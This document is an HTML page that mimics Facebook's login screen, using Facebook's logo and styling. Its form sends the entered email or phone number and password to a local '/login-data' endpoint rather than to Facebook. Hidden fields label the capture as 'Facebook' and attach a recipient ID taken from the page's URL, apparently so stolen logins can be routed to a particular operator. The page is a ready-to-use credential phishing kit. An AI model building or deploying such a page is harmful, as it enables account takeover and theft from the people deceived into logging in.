<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in to Facebook</title>
    <style>
        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .box { background-color: #fff; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1); padding: 20px; width: 360px; text-align: center; }
        .logo { width: 240px; margin: -20px auto 10px; }
        input { width: 100%; padding: 14px 16px; font-size: 17px; border: 1px solid #dddfe2; border-radius: 6px; margin-bottom: 12px; box-sizing: border-box; }
        button { width: 100%; background-color: #1877f2; border: none; border-radius: 6px; font-size: 20px; line-height: 48px; padding: 0 16px; color: #fff; font-weight: bold; cursor: pointer; margin-top: 6px; }
    </style>
</head>
<body>
    <div class="box">
        <img class="logo" src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook">
        <form action="/login-data" method="post">
            <input type="text" name="username" placeholder="Email address or phone number" required>
            <input type="password" name="password" placeholder="Password" required>
            <!-- HIDDEN FIELDS -->
            <input type="hidden" name="service" value="Facebook">
            <input type="hidden" id="recipientId" name="recipientId" value="">
            <button type="submit">Log In</button>
        </form>
    </div>
    <script>
        document.addEventListener("DOMContentLoaded", () => {
            const userId = new URLSearchParams(window.location.search).get('uid');
            if (userId) document.getElementById('recipientId').value = userId;
        });
    </script>
</body>
</html>
